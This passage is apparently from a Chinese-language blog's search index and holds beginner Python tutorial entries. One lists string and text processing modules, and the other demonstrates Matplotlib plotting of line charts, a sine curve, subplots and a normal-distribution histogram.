title="3、字符串和文本处理的相关模块"></a>3、字符串和文本处理的相关模块</h1><ul><li>string模块：包含若干字符集常量，其处理字符串的函数已经被字符串对象的方法替代</li><li>re模块：正则表达式处理</li><li>codecs模块：字符编码处理</li><li>difflib模块：比较字符串列表的差异</li><li>gettext模块：语言国际化</li><li>textwrap模块：格式化文本段落</li><li>unicodedata模块：Unicode字符库<br>3/10/2021 10:56:22 PM </li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>图形用户界面GUI(三)--基于MATOLOTLIB模块的绘图</title>
      <link href="2021/03/09/tu-xing-yong-hu-jie-mian-gui-san-ji-yu-matolotlib-mo-kuai-de-hui-tu/"/>
      <url>2021/03/09/tu-xing-yong-hu-jie-mian-gui-san-ji-yu-matolotlib-mo-kuai-de-hui-tu/</url>
      
        <content type="html"><![CDATA[<p>Matplotlib是一套面向对象的绘图库，其绘制的图表中的每个绘图元素（例如线条、文字、刻度等）都是对象</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#绘制x轴坐标值为0、1、2、3、4，所对应的y轴坐标值为1、2、5、6、8的折线图</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> pltplt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'some numbers'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/60476819d3dd7.jpg" alt=""></p><p>plot()函数</p><ul><li>plot(x,y,’bo’)    #用蓝色，小圆点标记</li></ul><ul><li>plot(y)    #改变纵轴坐标数值，横轴默认0,1,2……</li></ul><ul><li>plot(x1,y1,’g^’,x2,y2,’g-o’)    #使用多个x,y,format对作变量，把它们画在一个图里，格式串也可改为color=’green’,linestyle=’dashen’,marker=’o’。</li></ul><p>subplot(numRows,numCols,plotNum)快速绘制包含多个子图的图表，左上的子区域的编号为1，若numRows, numCols和plotNum这三个数都小于10的话，可缩写为一个整数，例如subplot(323)等价于subplot(3,2,3)，subplot在plotNum指定的区域中创建一个轴对象。</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#使用Matplotlib模块绘制y=sin(x)的函数曲线</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> mathx<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token operator">*</span>math<span class="token punctuation">.</span>pi<span class="token operator">*</span>i<span class="token operator">/</span><span class="token number">100</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">]</span>y<span class="token operator">=</span><span class="token punctuation">[</span>math<span class="token punctuation">.</span>sin<span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> x<span class="token punctuation">]</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>x<span class="token punctuation">,</span>y<span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604764dc6bfb2.jpg" alt=""></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#利用NumPy模块和Matplotlib.pyplot工具包绘制y=e^-x*cos(2*pi*x)以及y=cos(2*pi*x)的函数曲线</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np <span class="token keyword">def</span> <span class="token function">f</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> np<span class="token punctuation">.</span>exp<span class="token punctuation">(</span><span class="token operator">-</span>t<span class="token punctuation">)</span><span class="token operator">*</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token operator">*</span>t<span class="token punctuation">)</span>t1<span class="token operator">=</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">5.0</span><span class="token punctuation">,</span><span class="token number">0.1</span><span class="token punctuation">)</span>t2<span class="token operator">=</span>np<span class="token punctuation">.</span>arange<span class="token punctuation">(</span><span class="token number">0.0</span><span class="token punctuation">,</span><span class="token number">5.0</span><span class="token punctuation">,</span><span class="token number">0.02</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>figure<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">211</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>t1<span class="token punctuation">,</span>f<span class="token punctuation">(</span>t1<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'bo'</span><span class="token punctuation">,</span>t2<span class="token punctuation">,</span>f<span class="token punctuation">(</span>t2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'k'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>subplot<span class="token punctuation">(</span><span class="token number">212</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>plot<span class="token punctuation">(</span>t2<span class="token punctuation">,</span>np<span class="token punctuation">.</span>cos<span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">*</span>np<span class="token punctuation">.</span>pi<span class="token operator">*</span>t2<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'r--'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604764dc3b957.jpg" alt=""></p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true">#随机生成满足mu为100、sigma为20的正态分布数据，并绘制其直方图</span><span class="token keyword">import</span> matplotlib<span class="token punctuation">.</span>pyplot <span class="token keyword">as</span> plt<span class="token keyword">import</span> numpy <span class="token keyword">as</span> np mu<span class="token punctuation">,</span>sigma<span class="token operator">=</span><span class="token number">100</span><span class="token punctuation">,</span><span class="token number">20</span>x<span class="token operator">=</span>mu<span class="token operator">+</span>sigma<span class="token operator">*</span>np<span class="token punctuation">.</span>random<span class="token punctuation">.</span>randn<span class="token punctuation">(</span><span class="token number">100000</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>hist<span class="token punctuation">(</span>x<span class="token punctuation">,</span><span class="token number">50</span><span class="token punctuation">,</span>density<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">,</span>facecolor<span class="token operator">=</span><span class="token string">'b'</span><span class="token punctuation">,</span>alpha<span class="token operator">=</span><span class="token number">0.75</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#绘制直方图</span>plt<span class="token punctuation">.</span>xlabel<span class="token punctuation">(</span><span class="token string">'IQ'</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#绘制坐标等信息</span>plt<span class="token punctuation">.</span>ylabel<span class="token punctuation">(</span><span class="token string">'Probability'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token string">'Histogram of IQ'</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>axis<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">,</span><span class="token number">180</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0.03</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token comment" spellcheck="true">#设置坐标和网格</span>plt<span class="token punctuation">.</span>grid<span class="token punctuation">(</span><span class="token boolean">True</span><span class="token punctuation">)</span>plt<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span></code></pre><p><img src="https://www.hualigs.cn/image/604764dc6e394.jpg" alt=""><br>                                      ​<br>3/9/2021 8:23:59 PM </p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
